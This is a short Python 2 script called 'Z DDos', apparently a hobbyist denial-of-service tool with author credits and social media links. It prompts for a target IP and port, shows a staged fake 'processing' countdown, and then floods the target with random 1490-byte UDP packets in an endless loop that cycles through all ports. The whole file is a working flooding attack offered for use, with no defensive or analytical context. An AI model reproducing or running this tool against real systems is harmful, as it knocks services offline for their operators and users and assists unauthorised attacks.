import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Z DDos")
print
print "Author   : antrax-mx"
print "Instagram: https://www.instagram.com/z_.wark"
print "github   : https://github.com/Z-wark"
print "Facebook : https://www.facebook.com/diego.alfonzo.73594479"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "Procesando...."
time.sleep(5)
print "Procesando 10%"
time.sleep(5)
print "Procesando 25%"
time.sleep(5)
print "Procesando 50%"
time.sleep(5)
print "Procesando 83%"
time.sleep(3)
print "Proceso Completo..."
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

